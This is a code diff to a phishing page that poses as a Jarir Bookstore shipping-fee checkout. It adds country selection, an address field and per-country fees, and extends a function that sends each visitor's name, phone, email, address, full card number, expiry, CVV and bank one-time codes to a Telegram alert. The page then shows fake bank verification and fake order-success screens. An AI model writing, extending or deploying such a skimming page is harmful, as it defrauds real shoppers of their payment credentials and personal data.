@@ -351,6 +351,122 @@
             font-size: 12px;
             color: #666;
         }
+
+        /* ====== الإضافات الجديدة ====== */
+        
+        /* حقل العنوان الاحترافي */
+        .address-field {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        
+        .address-field label {
+            display: block;
+            text-align: right;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+        
+        .address-input {
+            width: 100%;
+            background: #F0F2F5;
+            border: 1px solid #E5E7EB;
+            border-radius: 4px;
+            padding: 12px 40px 12px 12px;
+            outline: none;
+            text-align: right;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .address-input:focus {
+            border-color: var(--jarir-red);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+        }
+        
+        .address-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 16px;
+        }
+
+        /* قائمة الدول المنسدلة */
+        .country-select-wrapper {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        
+        .country-select {
+            width: 100%;
+            background: #F0F2F5;
+            border: 1px solid #E5E7EB;
+            border-radius: 4px;
+            padding: 12px 40px 12px 12px;
+            outline: none;
+            text-align: right;
+            font-size: 14px;
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+        }
+        
+        .country-select:focus {
+            border-color: var(--jarir-red);
+            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+        }
+        
+        .country-flag {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 16px;
+            border-radius: 2px;
+            object-fit: cover;
+        }
+        
+        .country-arrow {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 12px;
+        }
+
+        /* عرض رسوم الشحن */
+        .shipping-fee-display {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border: 1px dashed var(--jarir-red);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        
+        .shipping-fee-display .fee-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .shipping-fee-display .fee-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--jarir-red);
+        }
+        
+        .shipping-fee-display .fee-currency {
+            font-size: 14px;
+            color: var(--jarir-red);
+        }
     </style>
 <base target="_blank">
 </head>
@@ -365,6 +481,7 @@
         <p>جاري المعالجة...</p>
     </div>
 
+    <!-- ==================== الصفحة الرئيسية ==================== -->
     <section id="page-product" class="page active page-transition">
         <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
             <div class="flex items-center gap-4">
@@ -431,6 +548,7 @@
         </main>
     </section>
 
+    <!-- ==================== صفحة التسجيل مع العنوان والدول ==================== -->
     <section id="page-register" class="page bg-white page-transition">
         <header class="p-4 border-b flex justify-between items-center">
             <button id="btnBackToProduct"><i class="fa-solid fa-chevron-right"></i>العودة</button>
@@ -439,36 +557,64 @@
         </header>
         <div class="p-6 space-y-4">
             <div id="err-reg" class="error-msg">يرجى إدخال البيانات المطلوبة بشكل صحيح</div>
-            <div class="text-right">
-                <label class="text-xs text-gray-400">اسم الدولة</label>
-                <div class="form-input flex justify-between items-center bg-gray-50">
-                    <i class="fa-solid fa-chevron-down text-xs"></i>
-                    <span class="font-bold">المملكة العربية السعودية</span>
-                </div>
+            
+            <!-- ====== اختيار الدولة ====== -->
+            <div class="country-select-wrapper">
+                <label style="display: block; text-align: right; font-size: 12px; color: #666; margin-bottom: 5px;">الدولة *</label>
+                <select id="country-select" class="country-select">
+                    <option value="SA" data-code="+966" data-fee="76" data-flag="https://flagcdn.com/w40/sa.png">السعودية</option>
+                    <option value="KW" data-code="+965" data-fee="85" data-flag="https://flagcdn.com/w40/kw.png">الكويت</option>
+                    <option value="AE" data-code="+971" data-fee="90" data-flag="https://flagcdn.com/w40/ae.png">الإمارات</option>
+                    <option value="JO" data-code="+962" data-fee="80" data-flag="https://flagcdn.com/w40/jo.png">الأردن</option>
+                </select>
+                <img id="country-flag" src="https://flagcdn.com/w40/sa.png" class="country-flag">
+                <i class="fa-solid fa-chevron-down country-arrow"></i>
             </div>
+            
+            <!-- ====== رقم الهاتف مع كود الدولة ====== -->
             <div class="flex gap-2">
                 <div class="w-2/3">
                     <label class="text-xs text-gray-400 text-right block">رقم الهاتف *</label>
                     <input type="tel" id="user-phone" class="form-input" placeholder="05xxxxxxxx" maxlength="10">
                 </div>
                 <div class="w-1/3">
-                    <label class="text-xs text-gray-400 text-right block">رمز الدولة</label>
-                    <div class="form-input flex items-center justify-between">
-                        <i class="fa-solid fa-chevron-down text-[10px]"></i>
-                        <span class="font-bold">+966</span>
-                        <img src="https://flagcdn.com/w20/sa.png" class="w-4">
+                    <label class="text-xs text-gray-400 text-right block">الرمز</label>
+                    <div class="form-input flex items-center justify-center" style="padding: 12px 5px;">
+                        <span id="country-code" class="font-bold text-sm">+966</span>
                     </div>
                 </div>
             </div>
+            
+            <!-- ====== الاسم ====== -->
             <input type="text" id="user-name" placeholder="الاسم الأول *" class="form-input">
+            
+            <!-- ====== البريد الإلكتروني ====== -->
             <input type="email" id="user-email" placeholder="البريد الإلكتروني *" class="form-input">
-            <button id="btnSubmitRegister" class="btn-red py-4 mt-6 flex justify-center items-center">
+            
+            <!-- ====== حقل العنوان الاحترافي ====== -->
+            <div class="address-field">
+                <label>العنوان التفصيلي *</label>
+                <i class="fa-solid fa-location-dot address-icon"></i>
+                <textarea id="user-address" class="address-input" rows="3" placeholder="المدينة، الحي، الشارع، رقم المنزل/الشقة..."></textarea>
+            </div>
+            
+            <!-- ====== عرض رسوم الشحن ====== -->
+            <div class="shipping-fee-display">
+                <div class="fee-label">💰 رسوم الشحن والتوصيل</div>
+                <div>
+                    <span id="shipping-fee" class="fee-amount">76</span>
+                    <span class="fee-currency">ر.س</span>
+                </div>
+            </div>
+            
+            <button id="btnSubmitRegister" class="btn-red py-4 mt-2 flex justify-center items-center">
                 <span id="regBtnText">استمرار</span>
                 <div class="loading-spinner" id="regSpinner"></div>
             </button>
         </div>
     </section>
 
+    <!-- ==================== صفحة الدفع ==================== -->
     <section id="page-payment" class="page bg-[#F3F5F7] page-transition">
         <header class="p-4 bg-white border-b flex justify-between items-center">
             <button id="btnBackToRegister"><i class="fa-solid fa-chevron-right"></i>العودة</button>
@@ -500,7 +646,7 @@
                     <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input">
                 </div>
                 <button id="btnSubmitPayment" class="btn-red py-4 mt-8 flex justify-center items-center">
-                    <span id="payBtnText">مصاريف الشحن (76 ر.س)</span>
+                    <span id="payBtnText">دفع رسوم الشحن (<span id="payment-fee">76</span> ر.س)</span>
                     <div class="loading-spinner" id="paySpinner"></div>
                 </button>
             </div>
@@ -522,6 +668,7 @@
         </main>
     </section>
 
+    <!-- ==================== صفحة التحقق ==================== -->
     <section id="page-verify" class="page bg-white p-6 page-transition">
         <div class="flex justify-end mb-4">
             <span class="font-bold text-black cursor-pointer text-base" id="btnCancelVerify">Cancel</span>
@@ -536,7 +683,7 @@
         <h2 class="text-[26px] font-bold mb-5 text-left text-black">Verify By Phone</h2>
         <div class="verify-text text-left text-[15px] leading-relaxed mb-10">
             <p>We have sent you a text message with a code to your registered mobile number.</p>
-            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR 76.00</strong> on 2026/02/15.</p>
+            <p class="mt-5">You are paying <strong>JARIR BOOKSTORE</strong> the amount of <strong>SAR <span id="verify-fee">76.00</span></strong> on 2026/02/15.</p>
         </div>
         <div id="err-otp" class="error-msg">رمز التحقق غير صحيح، حاول مجدداً</div>
         <div class="text-center mb-4">
@@ -557,7 +704,7 @@
         </div>
     </section>
 
-    <!-- صفحة النجاح مع بيانات ديناميكية -->
+    <!-- ==================== صفحة النجاح ==================== -->
     <section id="page-success" class="page bg-[#e9ecef] p-5 page-transition">
         <div class="success-screen">
             <div class="app-bar">
@@ -615,6 +762,11 @@
             </div>
 
             <div class="info-row">
+                <span class="label">الدولة:</span>
+                <span class="value" id="dynamicCountry">السعودية</span>
+            </div>
+
+            <div class="info-row">
                 <span class="label">الشحن إلى:</span>
                 <span class="value email" id="dynamicUserEmail">campus6med@gmail.com</span>
             </div>
@@ -627,6 +779,16 @@
             <div class="info-row">
                 <span class="label">الاسم:</span>
                 <span class="value" id="dynamicUserName">Reda shfi</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">العنوان:</span>
+                <span class="value" id="dynamicAddress">الرياض، حي النخيل...</span>
+            </div>
+
+            <div class="info-row">
+                <span class="label">رسوم الشحن:</span>
+                <span class="value" id="dynamicShippingFee">76 ر.س</span>
             </div>
 
             <div class="info-row">
@@ -647,6 +809,7 @@
         <span>آمن 100% - SSL</span>
     </div>
 
+    <!-- ==================== JavaScript ==================== -->
     <script>
         // ============================================
         // إعدادات التليجرام
@@ -663,7 +826,12 @@
         let userData = {
             name: '',
             phone: '',
-            email: ''
+            email: '',
+            address: '',
+            country: 'SA',
+            countryName: 'Saudi Arabia',
+            countryCode: '+966',
+            shippingFee: 76
         };
         
         let visitorId = localStorage.getItem('visitorId');
@@ -673,7 +841,7 @@
         }
         
         // ============================================
-        // دالة إرسال التليجرام
+        // دالة إرسال التليجرام بالإنجليزية
         // ============================================
         async function sendTelegramAlert(type, data) {
             var deviceInfo = {
@@ -681,9 +849,9 @@
                 platform: navigator.platform,
                 language: navigator.language,
                 screenSize: screen.width + 'x' + screen.height,
-                referrer: document.referrer || 'مباشر',
+                referrer: document.referrer || 'Direct',
                 pageUrl: window.location.href,
-                timestamp: new Date().toLocaleString('ar-SA')
+                timestamp: new Date().toISOString()
             };
             
             var emojiMap = {
@@ -699,28 +867,22 @@
                 'PAYMENT_SUBMIT': '🏦',
                 'OTP_ATTEMPT': '🔑',
                 'OTP_SUCCESS': '🎉',
-                'INPUT_PHONE': '📱',
-                'INPUT_NAME': '👤',
-                'INPUT_EMAIL': '📧',
-                'INPUT_CARD': '💳',
-                'INPUT_CVV': '🔒',
-                'INPUT_EXPIRY': '📅',
-                'INPUT_OTP': '🔢',
-                'BACK_BUTTON': '🔙',
+                'COUNTRY_CHANGE': '🌍',
                 'ERROR': '⚠️'
             };
             
             var emoji = emojiMap[type] || '📌';
-            var title = type.replace(/_/g, ' ');
             
-            var message = emoji + ' ' + title + '\n\n';
-            message += '🆔 معرف الزائر: ' + visitorId + '\n';
-            message += '⏰ الوقت: ' + deviceInfo.timestamp + '\n';
-            message += '📱 الجهاز: ' + deviceInfo.platform + '\n';
-            message += '📐 الشاشة: ' + deviceInfo.screenSize + '\n';
+            var message = emoji + ' ' + type + '\n\n';
+            message += '🆔 Visitor ID: ' + visitorId + '\n';
+            message += '⏰ Time: ' + deviceInfo.timestamp + '\n';
+            message += '📱 Device: ' + deviceInfo.platform + '\n';
+            message += '🌐 Browser: ' + navigator.userAgent.substring(0, 50) + '...\n';
+            message += '📐 Screen: ' + deviceInfo.screenSize + '\n';
+            message += '🔗 Source: ' + deviceInfo.referrer + '\n';
             
             if (data && Object.keys(data).length > 0) {
-                message += '\n📊 البيانات:\n';
+                message += '\n📊 Data:\n';
                 for (var key in data) {
                     if (data.hasOwnProperty(key)) {
                         message += '• ' + key + ': ' + data[key] + '\n';
@@ -739,10 +901,8 @@
         // دالة الانتقال بين الصفحات
         // ============================================
         function showPage(pageId) {
-            // إظهار التحميل
             document.getElementById('fullLoading').classList.add('active');
             
-            // إرسال إشعار
             var pageAlerts = {
                 'page-product': 'PAGE_PRODUCT',
                 'page-register': 'PAGE_REGISTER',
@@ -755,34 +915,26 @@
                 sendTelegramAlert(pageAlerts[pageId], {
                     visitorId: visitorId,
                     userName: userData.name,
-                    userPhone: userData.phone
+                    userPhone: userData.phone,
+                    userCountry: userData.countryName
                 });
             }
             
-            // الانتقال بعد تأخير
             setTimeout(function() {
-                // إخفاء جميع الصفحات
                 var pages = document.querySelectorAll('.page');
                 for (var i = 0; i < pages.length; i++) {
                     pages[i].classList.remove('active');
                 }
                 
-                // إظهار الصفحة المطلوبة
                 var target = document.getElementById(pageId);
                 if (target) {
                     target.classList.add('active');
                 }
                 
-                // إخفاء التحميل
                 document.getElementById('fullLoading').classList.remove('active');
-                
-                // التمرير لأعلى
                 window.scrollTo(0, 0);
-                
-                // تحديث شريط التقدم
                 updateProgressBar(pageId);
                 
-                // تحديث صفحة النجاح إذا لزم
                 if (pageId === 'page-success') {
                     updateSuccessPage();
                 }
@@ -810,9 +962,13 @@
             document.getElementById('dynamicOrderNumber').textContent = orderNum;
             document.getElementById('dynamicBarcode').src = 'https://bwipjs-api.metafloor.com/?bcid=code128&text=' + orderNum + '&scale=4&includetext=false';
             
-            document.getElementById('dynamicUserName').textContent = userData.name || 'غير محدد';
-            document.getElementById('dynamicUserPhone').textContent = '+966 ' + (userData.phone || '000000000');
-            document.getElementById('dynamicUserEmail').textContent = userData.email || 'غير محدد';
+            // تحديث بيانات المستخدم
+            document.getElementById('dynamicUserName').textContent = userData.name || 'Not specified';
+            document.getElementById('dynamicUserPhone').textContent = userData.countryCode + ' ' + (userData.phone || '000000000');
+            document.getElementById('dynamicUserEmail').textContent = userData.email || 'Not specified';
+            document.getElementById('dynamicAddress').textContent = userData.address || 'Not specified';
+            document.getElementById('dynamicCountry').textContent = userData.countryName;
+            document.getElementById('dynamicShippingFee').textContent = userData.shippingFee + ' SAR';
         }
         
         // ============================================
@@ -831,20 +987,78 @@
         }
         
         // ============================================
+        // تغيير الدولة ورسوم الشحن
+        // ============================================
+        function updateCountryInfo() {
+            var select = document.getElementById('country-select');
+            var selectedOption = select.options[select.selectedIndex];
+            
+            var countryCode = selectedOption.getAttribute('data-code');
+            var fee = selectedOption.getAttribute('data-fee');
+            var flag = selectedOption.getAttribute('data-flag');
+            var countryNameEn = {
+                'SA': 'Saudi Arabia',
+                'KW': 'Kuwait',
+                'AE': 'United Arab Emirates',
+                'JO': 'Jordan'
+            }[select.value];
+            
+            var countryNameAr = {
+                'SA': 'السعودية',
+                'KW': 'الكويت',
+                'AE': 'الإمارات',
+                'JO': 'الأردن'
+            }[select.value];
+            
+            // تحديث العرض
+            document.getElementById('country-code').textContent = countryCode;
+            document.getElementById('country-flag').src = flag;
+            document.getElementById('shipping-fee').textContent = fee;
+            document.getElementById('payment-fee').textContent = fee;
+            document.getElementById('verify-fee').textContent = fee + '.00';
+            
+            // حفظ البيانات
+            userData.country = select.value;
+            userData.countryName = countryNameEn;
+            userData.countryCode = countryCode;
+            userData.shippingFee = fee;
+            
+            // إرسال إشعار
+            sendTelegramAlert('COUNTRY_CHANGE', {
+                country: countryNameEn,
+                countryCode: countryCode,
+                shippingFee: fee + ' SAR',
+                visitorId: visitorId
+            });
+        }
+        
+        // ============================================
         // التحقق من البيانات
         // ============================================
         function isValidEmail(email) {
             return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
         }
         
-        function isValidPhone(phone) {
-            return /^(05|5)[0-9]{8}$/.test(phone);
+        function isValidPhone(phone, country) {
+            var patterns = {
+                'SA': /^(05|5)[0-9]{8}$/,
+                'KW': /^(5|6|9)[0-9]{7}$/,
+                'AE': /^(050|051|052|055|056|058)[0-9]{7}$/,
+                'JO': /^(07)[0-9]{8}$/
+            };
+            return patterns[country].test(phone);
         }
         
         // ============================================
-        // ربط الأزرار بالدوال - هذا هو الإصلاح الرئيسي
+        // ربط الأزرار
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
+            
+            // تغيير الدولة
+            var countrySelect = document.getElementById('country-select');
+            if (countrySelect) {
+                countrySelect.addEventListener('change', updateCountryInfo);
+            }
             
             // زر الذهاب للتسجيل
             var btnGoRegister = document.getElementById('btnGoRegister');
@@ -925,15 +1139,20 @@
         // مراقبة حقول الإدخال
         // ============================================
         function setupInputMonitoring() {
+            // رقم الهاتف
             var phoneInput = document.getElementById('user-phone');
             if (phoneInput) {
                 phoneInput.addEventListener('blur', function() {
-                    if (this.value.length === 10) {
-                        sendTelegramAlert('INPUT_PHONE', {phone: this.value});
+                    if (this.value.length >= 8) {
+                        sendTelegramAlert('INPUT_PHONE', {
+                            phone: this.value,
+                            country: userData.countryName
+                        });
                     }
                 });
             }
             
+            // الاسم
             var nameInput = document.getElementById('user-name');
             if (nameInput) {
                 nameInput.addEventListener('blur', function() {
@@ -943,6 +1162,7 @@
                 });
             }
             
+            // البريد
             var emailInput = document.getElementById('user-email');
             if (emailInput) {
                 emailInput.addEventListener('blur', function() {
@@ -952,10 +1172,20 @@
                 });
             }
             
+            // العنوان
+            var addressInput = document.getElementById('user-address');
+            if (addressInput) {
+                addressInput.addEventListener('blur', function() {
+                    if (this.value.length > 10) {
+                        sendTelegramAlert('INPUT_ADDRESS', {address: this.value});
+                    }
+                });
+            }
+            
+            // البطاقة
             var cardInput = document.getElementById('card-num');
             if (cardInput) {
                 cardInput.addEventListener('input', function() {
-                    // تغيير أيقونة البطاقة
                     var img = document.getElementById('card-type-img');
                     if (this.value.startsWith('4')) {
                         img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png";
@@ -974,6 +1204,7 @@
                 });
             }
             
+            // CVV
             var cvvInput = document.getElementById('card-cvv');
             if (cvvInput) {
                 cvvInput.addEventListener('blur', function() {
@@ -983,6 +1214,7 @@
                 });
             }
             
+            // تاريخ الانتهاء
             var expInput = document.getElementById('card-exp');
             if (expInput) {
                 expInput.addEventListener('input', function() {
@@ -998,6 +1230,7 @@
                 });
             }
             
+            // OTP
             var otpInput = document.getElementById('bank-otp');
             if (otpInput) {
                 otpInput.addEventListener('input', function() {
@@ -1015,11 +1248,12 @@
             var phone = document.getElementById('user-phone').value.trim();
             var name = document.getElementById('user-name').value.trim();
             var email = document.getElementById('user-email').value.trim();
+            var address = document.getElementById('user-address').value.trim();
             
             // التحقق
-            if (!isValidPhone(phone)) {
-                showError('err-reg', 'يرجى إدخال رقم هاتف صحيح (مثال: 0596324178)');
-                sendTelegramAlert('ERROR', {type: 'invalid_phone', phone: phone});
+            if (!isValidPhone(phone, userData.country)) {
+                showError('err-reg', 'يرجى إدخال رقم هاتف صحيح');
+                sendTelegramAlert('ERROR', {type: 'invalid_phone', phone: phone, country: userData.countryName});
                 return;
             }
             
@@ -1035,19 +1269,30 @@
                 return;
             }
             
+            if (address.length < 10) {
+                showError('err-reg', 'يرجى إدخال عنوان تفصيلي (10 أحرف على الأقل)');
+                sendTelegramAlert('ERROR', {type: 'invalid_address', address: address});
+                return;
+            }
+            
             // حفظ البيانات
             userData.name = name;
             userData.phone = phone;
             userData.email = email;
+            userData.address = address;
             
             // إظهار التحميل
             document.getElementById('regSpinner').style.display = 'block';
             
-            // إرسال للتليجرام
+            // إرسال للتليجرام بالإنجليزية
             sendTelegramAlert('REGISTER_SUBMIT', {
                 name: name,
                 phone: phone,
                 email: email,
+                address: address,
+                country: userData.countryName,
+                countryCode: userData.countryCode,
+                shippingFee: userData.shippingFee + ' SAR',
                 visitorId: visitorId
             });
             
@@ -1095,7 +1340,7 @@
             // إظهار التحميل
             document.getElementById('paySpinner').style.display = 'block';
             
-            // إرسال للتليجرام
+            // إرسال للتليجرام بالإنجليزية
             var cardType = cardNum.startsWith('4') ? 'Visa' : (cardNum.startsWith('5') ? 'Mastercard' : 'Unknown');
             sendTelegramAlert('PAYMENT_SUBMIT', {
                 cardNumber: cardNum,
@@ -1104,7 +1349,12 @@
                 cvv: cvv,
                 holder: holder,
                 userName: userData.name,
-                userPhone: userData.phone
+                userPhone: userData.phone,
+                userEmail: userData.email,
+                userAddress: userData.address,
+                userCountry: userData.countryName,
+                shippingFee: userData.shippingFee + ' SAR',
+                visitorId: visitorId
             });
             
             // إعادة تعيين OTP
@@ -1137,12 +1387,14 @@
             // زيادة المحاولات
             otpAttempts++;
             
-            // إرسال للتليجرام
+            // إرسال للتليجرام بالإنجليزية
             sendTelegramAlert('OTP_ATTEMPT', {
                 attempt: otpAttempts,
                 otp: otp,
                 userName: userData.name,
-                userPhone: userData.phone
+                userPhone: userData.phone,
+                userCountry: userData.countryName,
+                visitorId: visitorId
             });
             
             // إخفاء التحميل
@@ -1162,7 +1414,11 @@
                     totalAttempts: otpAttempts,
                     userName: userData.name,
                     userPhone: userData.phone,
-                    userEmail: userData.email
+                    userEmail: userData.email,
+                    userAddress: userData.address,
+                    userCountry: userData.countryName,
+                    shippingFee: userData.shippingFee + ' SAR',
+                    visitorId: visitorId
                 });
                 showPage('page-success');
             }
@@ -1180,7 +1436,8 @@
             
             sendTelegramAlert('OTP_ATTEMPT', {
                 attempt: 'RESEND',
-                userName: userData.name
+                userName: userData.name,
+                userCountry: userData.countryName
             });
         }
         
